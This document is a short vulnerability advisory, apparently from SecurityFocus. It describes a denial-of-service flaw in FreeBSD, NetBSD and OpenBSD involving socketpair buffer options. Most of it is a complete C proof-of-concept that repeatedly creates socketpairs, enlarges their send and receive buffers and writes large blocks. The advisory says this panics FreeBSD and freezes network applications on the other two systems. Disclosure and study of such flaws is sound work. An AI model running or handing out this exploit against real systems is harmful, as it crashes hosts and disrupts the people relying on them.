source: http://www.securityfocus.com/bid/1296/info

A denial of service attack exists that affects FreeBSD, NetBSD and OpenBSD. It is believed that all versions of these operating systems are vulnerable. The vulnerability is related to setting socket options regarding the size of the send and receive buffers on a socketpair. By setting them to certain values, and performing a write the size of the value the options have been set to, FreeBSD can be made to panic. NetBSD and OpenBSD do not panic, but network applications will stop responding.

Details behind why this happens have not been made available. 

#include        <unistd.h>
#include        <sys/socket.h>
#include        <fcntl.h> 
        
#define         BUFFERSIZE      204800

extern  int
main(void)
{
        int             p[2], i;
        char            crap[BUFFERSIZE]; 

        while (1)
        {
                if (socketpair(AF_UNIX, SOCK_STREAM, 0, p) == -1)
                        break;
                i = BUFFERSIZE;
                setsockopt(p[0], SOL_SOCKET, SO_RCVBUF, &i,
sizeof(int));
                setsockopt(p[0], SOL_SOCKET, SO_SNDBUF, &i, 
sizeof(int));
                setsockopt(p[1], SOL_SOCKET, SO_RCVBUF, &i,
sizeof(int));   
                setsockopt(p[1], SOL_SOCKET, SO_SNDBUF, &i,
sizeof(int));
                fcntl(p[0], F_SETFL, O_NONBLOCK);
                fcntl(p[1], F_SETFL, O_NONBLOCK);
                write(p[0], crap, BUFFERSIZE);
                write(p[1], crap, BUFFERSIZE);
        }
        exit(0);
}       